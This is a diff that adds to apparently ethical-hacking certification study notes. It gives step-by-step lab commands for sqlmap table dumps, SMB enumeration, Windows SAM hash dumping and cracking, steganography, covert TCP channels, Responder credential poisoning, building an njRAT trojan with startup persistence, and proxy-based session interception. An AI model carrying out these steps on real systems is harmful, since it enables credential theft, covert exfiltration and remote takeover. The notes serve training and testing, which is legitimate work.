@@ -78,3 +78,130 @@ Sqlmap -u http://www.m.com/viewprofile.aspx?=6 -D goodshopping -T user_login
 --columns --batch
 Sqlmap -u http://www.m.com/viewprofile.aspx?=6 -D goodshopping -T user_login
 --dump --batch
+
+Enum4Linux
+Enum4linux [options] IP
+enum4linux -u martin -p apple -U 10.10.10.12 | - u user -p pass -U get user list
+enum4linux -u martin -p apple -o 10.10.10.12 | -o get OS info
+enum4linux -u martin -p apple -P 10.10.10.12 | -P get password policy info
+enum4linux -u martin -p apple -G 10.10.10.12 | -G get groups and members info
+enum4linux -u martin -p apple -S 10.10.10.12 | -S get share list info
+enum4linux -u martin -p apple -a 10.10.10.12 | -a get all simple enumeration data [-U -S -G -P -r -o -n -i]
+
+
+
+Dump and Crack SAM (Security Account Manager) hashes
+Windows stores passwords in LM and NTLM hash format | NTLM New Technology LAN Manager.
+Need admin access to dump SAM.
+ WMIC (Windows Management Instrumentation Command) CLI to get info about local system
+wmic useraccount get name,sid | displays usernames and their SIDs
+Pwdump7 (To dump password hashes)
+pwdump7.exe -d c:\lockedfile.dat backup-lockedfile.dat |dump protected file
+Brows admin terminal to pwdump7 path and run pwdump.exe in cmd | shows password hashes
+PwDump7.exe > c:\hashes.txt | export hashes to path defined
+In text file replace boxes with account names obtained from WMIC. The last code numbers will be the 
+identity. And Save the file
+Ophcrack (To crack password hashes)
+To crack passwords not longer than 14 characters using only alphanumeric characters
+Open /x86 gui version. Load PWDUMP and select the hashes.txt file.
+Select Table Vista Free. Install it from location where ophcrack files are placed.
+Click Crack to start cracking
+
+
+Winrtgen – Create Rainbow table
+Click on add table
+Select hash NTLM, min length 4, max length 6, Chain Count 4000000, Charset Loweralpha
+Click OK on main window to start , table is saved in Winrtgen folder.
+Rainbow Crack
+Open rcrack_gui.exe
+Click File, then select Load NTLM hashes from PWDUMP
+Open Hashes.txt saved from before
+Now click Rainbow Table  Select Rainbow table  Select table created by winrtgen  crack process 
+automatically starts
+
+SNOW Steganographic Nature Of Whitespace) Hiding Data Using White Space Steganography
+Create a text file readme.txt like this 
+Copy it inside the SNOW folder 
+Open cmd in the folder
+Type snow -C -m "Secret message" -p "password" <original file name> <target file name> |-C 
+compression, -m message string, -p password | Hide method
+Type snow -C -p "password" <file name to unhide data>
+OpenStego – Image Steganography 
+Hide data
+ Select text message file which you want to hide
+ Select the cover file image where data is to be hidden
+ Set output path and file name
+ Set password if needed
+ Click Hide Data
+Extract Data
+ Select the stegno file
+ Set the Output folder path
+ Give the password
+Hello world!!!!!
+--------------------------------
+ Cick Extract Data
+QuickStego – Image Steganography 
+Hide data
+ Select the open image option to browse the image where data is to be hidden
+ Select the open text option to browse the text file which you want to hide
+ Click Hide Text to embed text in image
+ Click Save Image to output the result image
+Extract Data
+ Select the open image option to open the modified image
+ Hidden text will be displayed in right side bar
+
+
+Covert_TCP – Covert Channels | Hiding traffic in IP4 headers to avoid detection
+Sender side (10.10.10.11)
+ mkdir send
+ cd send
+ echo “secret” > message.txt
+ Copy covert_tcp.c from shared path
+ cc -o covert_tcp covert_tcp.c
+ To send message use command ./covert_tcp -dest 10.10.10.9 -source 10.10.10.11 -source_port 
+8888 -dest_port 9999 -file /root/Desktop/send/message.txt | -dest <destination/receiver IP> 
+-source<sender IP> -file <file path> | do not run until listener is started on receiver machine
+ Start wireshark before sending to capture the traffic
+ View IP4 header in Wireshark traffic to view message byte by byte in order
+Receiver side (10.10.10.9)
+ mkdir receive
+ cd receive
+ Copy covert_tcp.c from shared path
+ cc -o covert_tcp covert_tcp.c
+ To receive message start a listener using ./covert_tcp -dest 10.10.10.9 -source 10.10.10.11 
+-source_port 9999 -dest_port 8888 -server -file /home/ubuntu/Desktop/receive/receive.txt| 
+-dest <destination/receiver IP> -source<sender IP> -file <file path to store received file>
+
+
+Responder – LLMNR and NBT-NS Poisoning
+ Use windows 10 credentials Jason:qwerty
+ Run command responder -I eth0 in Kali | “-I” is in CAPS
+ Try to open a share \\ceh-tools from windows 10 machine. Responder will send fake replies. |
+Windows will use, LLMNR on UDP/5355 or NBT-NS on UDP/137 and will listen for broadcasts.
+ User will enter credentials and hash will be intercepted by responder
+ Responder log files in usr\share\responder\logs
+ Use john the ripper to crack the password using command john
+/usr/share/responder/logs/<file name of the logs.txt> | here file is SMBv2-NTLMv2-SSP10.10.10.10.txt
+
+
+
+njRAT
+ On victim machine open firewall settings and use recommended settings
+ On attacker machine start njRAT
+ Click start with default port 5552
+ Click on Builder tab on the bottom 
+ Enter HOST IP (Attacker machine), check options Copy To StartUp and Registry StartUp, and 
+click Build.
+ Save file as Test.exe
+ Open the malicious exe file on victim’s machine.
+ Connection would be shown on attacker njRAT window.
+ Now attacker can perform different actions on the victim machine
+
+
+SESSION HIJACKING
+OWASP Zed Attack Proxy (ZAP)
+ First set Victim’s Proxy settings to attacker’s IP and port 8080.
+ Open ZAP and enable Break Point and click green + to view break points
+ Go to settings  local Proxies  Change IP from localhost to network IP (in this case 
+10.10.10.16).
+ Browse from victim and view the request and responses on the attacker machine
